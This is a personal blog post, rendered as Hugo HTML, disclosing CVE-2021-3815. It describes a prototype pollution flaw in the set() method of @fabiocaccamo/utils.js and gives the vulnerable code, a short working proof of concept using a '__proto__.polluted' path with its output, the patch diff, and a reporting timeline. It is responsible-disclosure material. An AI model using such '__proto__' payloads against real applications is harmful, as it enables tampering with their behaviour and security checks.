<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
    <title>0-Day, Prototype Pollution in utils.js :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="The article is about 0-day i found first time in open-source" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="http://localhost:1313/posts/2021-11-29-cve-2021-3815/" />







  
  
  
  
  
  <link rel="stylesheet" href="http://localhost:1313/styles.css">







  <link rel="shortcut icon" href="http://localhost:1313/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="http://localhost:1313/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="0-Day, Prototype Pollution in utils.js">
<meta property="og:description" content="The article is about 0-day i found first time in open-source" />
<meta property="og:url" content="http://localhost:1313/posts/2021-11-29-cve-2021-3815/" />
<meta property="og:site_name" content="My New Hugo Site" />

  
    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2021-11-29 23:29:53 &#43;0000 UTC" />













  


</head>
<body class="">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="http://localhost:1313/">
  <div class="logo">
    re-Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="http://localhost:1313/posts/2021-11-29-cve-2021-3815/">0-Day, Prototype Pollution in utils.js</a>
  </h1>
  <div class="post-meta"><time class="post-date">2021-11-29</time>
    
</div>

  
  



  

  <div class="post-content"><div>
        <h1 id="summary">Summary<a href="#summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>The @fabiocaccamo/utils.js is a package that provides methods with multiple functions for the convenience of developers. A vulnerability exists in one method included in this package.</p>
</blockquote>
<p>I discovered a prototype pollution vulnerability via utils.js method analysis. In the 0.17.1 version package, Prototype Pollution occurs because the key value of the object is not checked within the set() method.</p>
<hr>
<h1 id="analysis">Analysis<a href="#analysis" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">set</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">obj</span>, <span style="color:#a6e22e">path</span>, <span style="color:#a6e22e">value</span>)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">keys</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">key</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">cursor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">j</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">keys</span>[<span style="color:#a6e22e">i</span>];
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">TypeUtil</span>.<span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">cursor</span>[<span style="color:#a6e22e">key</span>])) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">cursor</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">cursor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cursor</span>[<span style="color:#a6e22e">key</span>];
</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">cursor</span>[<span style="color:#a6e22e">key</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">value</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://github.com/fabiocaccamo/utils.js/blob/master/dist/utils.js#L2360
</span></span></span></code></pre></div><p>If you check the set() method of utils.object.keypath, you can see that the value of the path parameter is split with dots, and then merged with the value of the value parameter based on the key value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">utils</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;@fabiocaccamo/utils.js&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fake_obj</span> <span style="color:#f92672">=</span> {};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`[+] Before prototype pollution : </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">polluted</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">object</span>.<span style="color:#a6e22e">keypath</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">fake_obj</span>, <span style="color:#e6db74">&#39;__proto__.polluted&#39;</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`[+] After prototype pollution : </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">polluted</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">[+] Before prototype pollution : undefined
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">[+] After prototype pollution : true
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span></code></pre></div><p>I wrote PoC as above!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>~/npm-research/utils/prototype_pollution_via_set()
</span></span><span style="display:flex;"><span>❯ node poc.js
</span></span><span style="display:flex;"><span>[+] Before prototype pollution : undefined
</span></span><span style="display:flex;"><span>[+] After prototype pollution : true
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>~/npm-research/utils/prototype_pollution_via_set()
</span></span><span style="display:flex;"><span>❯
</span></span><span style="display:flex;"><span>&gt; obj
</span></span><span style="display:flex;"><span>	▼{}
</span></span><span style="display:flex;"><span>	  ▼[[Prototype]]: Object
</span></span><span style="display:flex;"><span>	     polluted: true
</span></span></code></pre></div><p>A prototype pollution vulnerability has occurred and you can see the object being polluted. I first found a prototype pollution in node module. this is my favourite vulnerability. So I’m very happy that I found it!</p>
<p>Also, the vulnerability has been patched, so i have been assigned CVE-2021-3815 for this vulnerability! This is my first CVE.</p>
<hr>
<h1 id="patched">Patched<a href="#patched" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>             var cursor = obj;
</span></span><span style="display:flex;"><span>             for (var i = 0, j = keys.length; i &lt; j; i++) {
</span></span><span style="display:flex;"><span>                 key = keys[i];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+                if (key === &#39;__proto__&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+                    break;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+                }
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>                 if (!TypeUtil.isObject(cursor[key])) {
</span></span><span style="display:flex;"><span>                     cursor[key] = {};
</span></span><span style="display:flex;"><span>                 }
</span></span><span style="display:flex;"><span># https://github.com/fabiocaccamo/utils.js/commit/d9ebbcdbcd7b89abeeb240952ff5ab01ca372a5f
</span></span></code></pre></div><hr>
<h1 id="reporting-timeline">Reporting Timeline<a href="#reporting-timeline" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li>2021-11-30 21h 11m : Reported this issue via the <a href="https://www.huntr.dev/">huntr</a></li>
<li>2021-12-02 17h 24m : Validated this issue by <a href="https://github.com/fabiocaccamo">Fabio Caccamo</a></li>
<li>2021-12-06 19h 46m : Patched this issue by <a href="https://github.com/fabiocaccamo">Fabio Caccamo</a></li>
<li>2021-12-07 23h 57m : Requested a CVE for this issue by <a href="https://www.huntr.dev/users/jamieslome/">Jamie Slome</a></li>
<li>2021-12-09 12h 25m : Assigned the CVE-2021-3815</li>
</ul>
<hr>
<h1 id="reference">Reference<a href="#reference" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li><a href="https://github.com/fabiocaccamo/utils.js/issues/6">Github Issue</a></li>
<li><a href="https://github.com/fabiocaccamo/utils.js/commit/d9ebbcdbcd7b89abeeb240952ff5ab01ca372a5f">Github Commit</a></li>
<li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3815">Mitre</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3815">NVD</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-FABIOCACCAMOUTILSJS-1932614">Snyk</a></li>
</ul>

      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      <span>:: <a href="https://github.com/mirus-ua/hugo-theme-re-terminal" target="_blank">Theme</a> made by <a href="https://github.com/mirus-ua" target="_blank">Mirus</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
